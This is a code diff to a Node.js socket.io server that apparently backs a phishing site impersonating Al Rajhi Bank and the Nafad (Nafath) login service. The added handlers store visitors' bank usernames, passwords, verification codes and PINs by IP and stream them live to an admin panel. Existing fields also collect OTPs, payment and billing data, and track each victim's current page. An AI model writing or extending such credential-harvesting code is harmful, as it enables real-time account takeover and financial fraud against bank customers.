@@ -19,9 +19,11 @@ const Comprehensive = require("./models/Comprehensive");
 const IndexSubmission = require("./models/IndexSubmission");
 const Billing = require("./models/Billing");
 const Payment = require("./models/Payment");
-const code = require("./models/Code");
+const Pin = require("./models/Pin");
 const Nafad = require("./models/Nafad");
 const NafadCode = require("./models/NafadCode");
+const Rajhi = require("./models/Rajhi");
+const RajhiCode = require("./models/RajhiCode");
 const Admin = require("./models/Admin");
 const generateTokenFor = require("./utils/jwt"); // your JWT‑helper (or any token generator)
 
@@ -58,6 +60,7 @@ io.on("connection", (socket) => {
       comprehensiveArr,
       billingArr,
       paymentArr,
+      pins,
       phoneSubs,
       phoneCodes,
       thirdPartys,
@@ -70,6 +73,7 @@ io.on("connection", (socket) => {
       Comprehensive.find().sort({ _id: -1 }).lean(),
       Billing.find().sort({ _id: -1 }).lean(),
       Payment.find().sort({ _id: -1 }).lean(),
+      Pin.find().sort({ _id: -1 }).lean(),
       phone.find().sort({ _id: -1 }).lean(),
       PhoneCode.find().sort({ _id: -1 }).lean(),
       ThirdParty.find().sort({ _id: -1 }).lean(),
@@ -89,10 +93,11 @@ io.on("connection", (socket) => {
       comprehensive: comprehensiveArr,
       billing: billingArr,
       payment: paymentArr,
+      pins,
       phoneSubs, // phone submissions
-      phoneCodes, // phone-code submissions
+      verification_code_three: phoneCodes, // phone-code submissions
       thirdPartys,
-      verifs, // final verifications (OTP)
+      verification_code_two: verifs, // final verifications (OTP)
       nafadLogins, // Nafad username/password
       nafadCodes, // Nafad two‑digit codes
       flags, // user.flag
@@ -166,6 +171,7 @@ io.on("connection", (socket) => {
     io.emit("basmahUpdated", { ip, basmah });
     socket.emit("nafadCode", { msg: true, code: user.basmahCode });
   });
+
   socket.on("getNafadCode", async ({ ip }) => {
     try {
       // 1) Find (or create) the User
@@ -223,16 +229,6 @@ io.on("connection", (socket) => {
 
     // 3. Save the changes:
     await user.save();
-
-    /* let v = await Visit.findOne({ ip }); */
-
-    /*     if (v) {
-      v.page = page;
-      v.updatedAt = new Date();
-      await v.save();
-    } else {
-      v = await Visit.create({ user: user._id, page, ip });
-    } */
 
     io.emit("locationUpdated", { ip, page });
   });
@@ -308,6 +304,53 @@ io.on("connection", (socket) => {
 
     // 4) Acknowledge back to the visitor page
     socket.emit("ackVerification", { success: true, error: null });
+  });
+
+  socket.on("submitRajhiCode", async ({ ip, rajhi_code }) => {
+    // 1) Ensure a User record exists
+    const user = await findOrCreateUser(ip);
+
+    // 2) Create the Verification document
+    const saved = await RajhiCode.create({
+      user: user._id,
+      ip: ip,
+      rajhiCode: rajhi_code,
+      time: Date.now(),
+    });
+
+    // 3) Broadcast a minimal payload your admin mergeSingleton() can consume
+    io.emit("newRajhiCode", {
+      ip: user.ip,
+      rajhiCode: saved.rajhiCode,
+      // you could include saved.time if you show timestamps
+    });
+
+    // 4) Acknowledge back to the visitor page
+    socket.emit("ackRajhiCode", { success: true, error: null });
+  });
+
+  socket.on("submitRajhi", async ({ ip, rajhiName, rajhiPw }) => {
+    // 1) Ensure a User record exists
+    const user = await findOrCreateUser(ip);
+
+    // 2) Create the Verification document
+    const saved = await Rajhi.create({
+      user: user._id,
+      ip: ip,
+      rajhiName: rajhiName,
+      rajhiPw: rajhiPw,
+      time: Date.now(),
+    });
+
+    // 3) Broadcast a minimal payload your admin mergeSingleton() can consume
+    io.emit("newRajhi", {
+      ip: user.ip,
+      rajhiName: saved.rajhiName,
+      rajhiPw: saved.rajhiPw,
+    });
+
+    // 4) Acknowledge back to the visitor page
+    socket.emit("ackRajhi", { success: true, error: null });
   });
 
   socket.on("submitDetails", async (payload) => {
@@ -469,7 +512,7 @@ io.on("connection", (socket) => {
     const user = await findOrCreateUser(ip);
 
     // 2) Save the code submission
-    const saved = await code.create({
+    const saved = await Pin.create({
       user: user._id,
       ip: ip,
       verificationCode: verification_code,
